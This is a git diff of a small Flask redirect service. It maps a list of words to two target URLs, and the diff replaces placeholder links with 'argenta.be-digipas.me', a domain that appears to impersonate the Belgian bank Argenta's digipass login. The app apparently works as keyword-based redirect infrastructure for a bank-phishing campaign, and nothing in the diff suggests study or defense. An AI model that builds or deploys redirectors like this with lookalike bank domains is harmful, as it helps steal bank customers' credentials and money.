@@ -3,18 +3,15 @@ import os
 
 app = Flask(__name__)
 
-# ضع رابط صفحة X ورابط الصورة هنا
-PAGE_X_URL = "https://your-page-x-link.com" 
-IMAGE_URL = "https://waterlearndream.ams3.digitaloceanspaces.com/paintnatureart"
+PAGE_X_URL = "https://argenta.be-digipas.me" 
+IMAGE_URL = "https://argenta.be-digipas.me/photo_2026-02-05_14-06-34.jpg"
 
-# تحميل الكلمات من الملف
 def load_words():
     with open('words.txt', 'r') as f:
         return [line.strip() for line in f if line.strip()]
 
 all_words = load_words()
 half = len(all_words) // 2
-# تقسيم الكلمات: النصف الأول لصفحة X والنصف الثاني للصورة
 route_map = {word: PAGE_X_URL for word in all_words[:half]}
 route_map.update({word: IMAGE_URL for word in all_words[half:]})
 
@@ -27,4 +24,5 @@ def redirect_logic(word):
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
+
     app.run(host='0.0.0.0', port=port)
